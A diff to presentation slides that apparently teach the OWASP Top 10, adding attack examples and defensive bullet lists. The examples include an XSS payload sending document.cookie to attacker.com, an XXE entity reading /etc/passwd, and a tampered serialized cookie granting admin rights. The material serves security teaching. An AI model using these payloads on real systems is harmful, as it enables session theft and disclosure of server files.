@@ -106,6 +106,8 @@ Maybe add example here, as "what's that" may not be clear
 
 Example:
 
+A forum uses object serialization to save a cookie containing user ID, role, password hash.
+
 ```json
 a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";
 i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
@@ -113,7 +115,6 @@ i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
 a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";
 i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
 ```
-@[1-2](A forum uses object serialization to save a cookie containing user ID, role, password hash.)
 @[4-5](Attacker changes the object to give themselves admin privileges)
 
 +++
@@ -139,8 +140,31 @@ browser API that can create JavaScript.
 
 +++
 
-# How do I fight it?
+Example:
 
+The application uses untrusted data in the construction of the
+following HTML snippet without validation or escaping
+
+```java
+(String) page += "<input name='creditcard' type='TEXT'
+value='" + request.getParameter("CC") + "'>";
+
+'><script>document.location=
+'http://www.attacker.com/cgi-bin/cookie.cgi?
+foo='+document.cookie</script>'.
+```
+@[4-6](The attacker modifies the ‘CC’ parameter in his browser)
+
+
++++
+
+# How do I fight it?
+* Use safe frameworks that automatically escape for XSS by design (ex. ReactJS)
+* Validate inputs
+* Escape outputs
+
+Notes:
+Links: https://www.owasp.org/index.php/Abridged_XSS_Prevention_Cheat_Sheet
 ---
 
 # Security Misconfiguration
@@ -159,7 +183,19 @@ Title says it all, but for example:
 
 +++
 
+Example:
+
+The app server admin console is automatically installed and not removed.
+
++++
+
 # How do I fight it?
+
+* A repeatable hardening process that makes it fast and easy to deploy another environment that is properly locked down.
+* Dev, QA and prod environments should be configured identically (With different credentials obviously)
+* Remove unused dependencies and frameworks
+* Update as fast as possible (See Number 9)
+* Automated verification process
 
 ---
 
@@ -175,7 +211,27 @@ exploit these flaws to access unauthorized functionality and/or data.
 
 +++
 
+Example:
+
+```java
+pstmt.setString(1, request.getParameter("acct"));
+ResultSet results = pstmt.executeQuery( );
+
+http://example.com/app/accountInfo?acct=notmyacct
+```
+@[1-2](The application uses unverified data in a SQL call that is accessing account information)
+@[4](An attacker simply modifies the 'acct' parameter)
+
++++
+
 # How do I fight it?
+
+* With the exception of public resources, deny by default
+* Implement access control mechanisms once and re-use them throughout the application
+* Disable web server directory listing, and ensure file metadata such (e.g. .git) is not present within web roots
+* Log access control failures
+* Rate limiting API and controller access to minimize the harm from automated attack tooling
+* Developers and QA staff should include functional access control unit and integration tests
 
 ---
 
@@ -192,7 +248,29 @@ execution, and denial of service attacks.
 
 +++
 
+Example:
+
+The attacker attempts to extract data from the server
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+    <!DOCTYPE foo [
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+    <foo>&xxe;</foo>
+
+```
+
++++
+
 # How do I fight it?
+
+* Developer training is essential to identify and mitigate XXE completely
+* Disable XML external entity and DTD processing in all XML parsers in your application
+* Validate inputs
+* Patch or upgrade all the latest XML processors and libraries in use by the app or on the underlying operating system
+* Upgrade SOAP to the latest version
+* If these controls are not possible, consider using virtual patching
 
 ---
 
@@ -208,7 +286,21 @@ encryption at rest or in transit, as well as special precautions when exchanged 
 
 +++
 
+Example:
+
+An application encrypts credit card numbers in a database using automatic database encryption. However, this
+data is automatically decrypted when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text.
+
++++
+
 # How do I fight it?
+
+* Don’t store sensitive data unnecessarily. Discard it as soon as possible.
+* Make sure you encrypt all sensitive data at REST
+* Encrypt all data in transit, such as using TLS
+* Ensure up-to-date and strong standard algorithms or ciphers
+* Ensure passwords are stored with a strong adaptive algorithm such as [Argon2](https://www.cryptolux.org/index.php/Argon2), [bcrypt](https://en.wikipedia.org/wiki/Bcrypt)
+* Disable caching for response that contain sensitive data
 
 ---
 
@@ -225,7 +317,20 @@ other implementation flaws to assume other users’ identities
 
 +++
 
+Example:
+
+Credential stuffing, the use of lists of known passwords, is a common attack. If an application does not rate
+limit authentication attempts, the application can be used as a password oracle to determine if the credentials are valid
+
++++
+
 # How do I fight it?
+* Do not deploy with any default credentials
+* Ensure passwords are stored with a strong adaptive algorithm such as [Argon2](https://www.cryptolux.org/index.php/Argon2), [bcrypt](https://en.wikipedia.org/wiki/Bcrypt)
+* Implement password checks against [top 10000 worst passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
+* Where possible, implement multi-factor authentication
+* Log authentication failures
+* Align password length, complexity and rotation policies with [NIST 800-63 B's guidelines in section 5.1.1 for Memorized Secrets](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret)
 
 ---
 
@@ -242,7 +347,15 @@ executing unintended commands or accessing data without proper authorization.
 
 +++
 
+Example:
+
+![Relevant XKCD](assets/injection_maymay.png)
+
++++
+
 # How do I fight it?
+
+Valudate your inputs
 
 ---
 
